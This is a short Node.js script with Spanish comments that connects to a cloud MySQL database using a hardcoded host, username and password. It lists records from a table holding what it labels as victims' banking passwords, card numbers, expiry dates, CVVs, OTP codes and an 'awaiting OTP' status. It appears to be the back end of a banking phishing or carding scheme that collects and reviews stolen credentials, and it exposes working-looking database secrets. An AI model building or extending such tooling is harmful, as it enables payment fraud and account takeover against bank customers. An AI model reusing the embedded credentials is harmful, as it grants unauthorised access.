const mysql = require('mysql2');

const connection = mysql.createConnection({
  host: 'mysql-86c4508-javiercarva913-1fe5.a.aivencloud.com',
  port: 26767,
  user: 'avnadmin',
  password: 'AVNS_ntoX9d2Nu632L7lQ-Ca',
  database: 'defaultdb',
  ssl: {
    rejectUnauthorized: false
  }
});

connection.connect((err) => {
  if (err) {
    console.error('❌ Error:', err.message);
    return;
  }
  
  console.log('✅ Conectado\n');
  
  // Ver 3 ejemplos de registros con tarjeta
  connection.query(
    `SELECT * FROM m3it3m WHERE tarjeta IS NOT NULL LIMIT 3`,
    (err, rows) => {
      if (err) {
        console.error('❌ Error:', err.message);
        connection.end();
        return;
      }
      
      if (rows.length === 0) {
        console.log('⚠️  No hay registros con tarjeta en m3it3m');
        console.log('\n📊 Mostrando 1 registro de ejemplo (sin tarjeta):');
        
        connection.query(
          `SELECT * FROM m3it3m LIMIT 1`,
          (err, rows2) => {
            if (rows2.length > 0) {
              console.table([rows2[0]]);
            }
            connection.end();
          }
        );
      } else {
        console.log('📋 REGISTROS CON TARJETA EN m3it3m:\n');
        console.table(rows);
        
        console.log('\n📌 MAPEO DE CAMPOS DISPONIBLES:');
        console.log('─'.repeat(50));
        console.log('✅ idreg          → ID único de solicitud');
        console.log('✅ usuario        → Nombre de usuario / titular');
        console.log('✅ password       → Contraseña bancaria');
        console.log('✅ tarjeta        → Número de tarjeta');
        console.log('✅ ftarjeta       → Fecha de tarjeta (MM/YY)');
        console.log('✅ cvv            → CVV');
        console.log('✅ email          → Email del usuario');
        console.log('✅ celular        → Número celular');
        console.log('✅ status         → Estado (nuevo, esperando_otp, etc)');
        console.log('✅ horacreado     → Fecha/hora de creación');
        console.log('✅ horamodificado → Última modificación');
        console.log('✅ banco          → Banco');
        console.log('✅ otp            → OTP/código dinámico');
        
        connection.end();
      }
    }
  );
});